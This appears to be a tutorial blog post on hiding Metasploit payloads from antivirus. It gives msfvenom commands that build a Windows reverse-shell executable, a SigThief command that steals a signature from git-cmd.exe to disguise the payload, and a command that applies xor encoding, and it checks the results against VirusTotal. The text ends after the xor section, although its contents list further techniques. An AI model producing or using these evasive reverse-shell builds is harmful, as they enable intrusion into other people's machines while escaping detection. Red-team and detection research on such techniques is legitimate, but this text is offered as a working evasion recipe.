### Making MSF payload almost invisible and bypassing most AVs

## Contents
- Introduction 

- Ways to obfuscate msf payloads
    - Basic msf payload
    - Using SigThief
    - Using xor 
    - Using shellcode with C shellcode loader
    - Using encryption (Alaris)
    
## Introduction 

Avs have significantly improved in recent years it still relies on age-old AV techniques that are often trivial to bypass. In this post we’ll analyse some basic pool of techniques which can be used to protect a basic msf payload to bypass most modern Avs. 

## Ways to hide msf payloads
In the following we will explore ways to encode/obfuscate msf payload and will have a goal to finally reach a point where we are satisfied with our results.

### Basic msf payload
Lets see how our basic msf payload stand againt Virustotal.

- Build command
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip here> LPORT=<port here> -f exe -o shivang_shell.ex
```

- Result

![Alt Text](https://i.ibb.co/rQrdx2j/basic-msf.png)

### Using SigThief
SigTheif is tool which takes a signature from a PE file and add that to another. Many Avs detect maalicous PE files based on signatures so this method can drop our detection rate to some extent.

- Build command
```
python sigthief.py -i git-cmd.exe -t shivang_shell.exe -o shivang_shell_2.exe
```

- Result

![Alt Text](https://i.ibb.co/BtSZkwQ/basic-msf-sig.png)

Droping only 2 detection is not at all a huge move here . Although there are many combination which can be tried from SighTheif but for now let's leave it here

### Using xor
With xor payload is decrypted inside the memeory once loaded via msfveom we can generate such payload 

- Build command

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip here> LPORT=<port here> -e x64/xor_dynamic -i 20 -f exe -o shivang_shell_xor.exe
```

- Result

![Alt Text](https://i.ibb.co/P9McckC/basic-msf-xor.png)

Well we are making some progress now.
